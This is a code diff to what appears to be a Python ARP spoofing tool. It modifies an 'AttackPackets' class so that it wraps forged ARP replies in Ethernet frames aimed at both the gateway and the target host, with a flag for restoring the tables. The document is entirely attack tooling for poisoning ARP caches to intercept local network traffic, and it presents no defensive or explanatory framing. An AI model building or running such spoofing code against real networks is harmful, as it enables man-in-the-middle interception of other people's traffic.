@@ -66,6 +66,7 @@ class ARPPacket(object):
 class AttackPackets(object):
     def __init__(self, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                  target_mac: str, target_ip: str):
+        self.ethertype: bytes = b'\x08\x06'  # ARP EtherType code
         self.restore_tables: bool = False
         self.attacker_mac = attacker_mac
         self.gateway_mac = gateway_mac
@@ -82,17 +83,23 @@ class AttackPackets(object):
     def gateway_packet(self):
         source_mac_addr = self.attacker_mac if self.restore_tables is False \
             else self.target_mac
-        packet_to_gateway = ARPPacket(source_mac_addr, self.target_ip,
-                                      self.gateway_mac, self.gateway_ip)
-        return packet_to_gateway.contents
+        eth_to_gateway = EthernetFrame(dest_hdwr=self.gateway_mac,
+                                       source_hdwr=self.attacker_mac,
+                                       ethertype=self.ethertype)
+        arp_to_gateway = ARPPacket(source_mac_addr, self.target_ip,
+                                   self.gateway_mac, self.gateway_ip)
+        return eth_to_gateway.payload + arp_to_gateway.payload
 
     @property
     def target_packet(self):
         source_mac_addr = self.attacker_mac if self.restore_tables is False \
             else self.gateway_mac
-        packet_to_target = ARPPacket(source_mac_addr, self.gateway_ip,
-                                     self.target_mac, self.target_ip)
-        return packet_to_target.contents
+        eth_to_target = EthernetFrame(dest_hdwr=self.target_mac,
+                                      source_hdwr=self.attacker_mac,
+                                      ethertype=self.ethertype)
+        arp_to_target = ARPPacket(source_mac_addr, self.gateway_ip,
+                                  self.target_mac, self.target_ip)
+        return eth_to_target.payload + arp_to_target.payload
 
     def restore_arp_tables(self, option: bool = True):
         self.restore_tables: bool = option
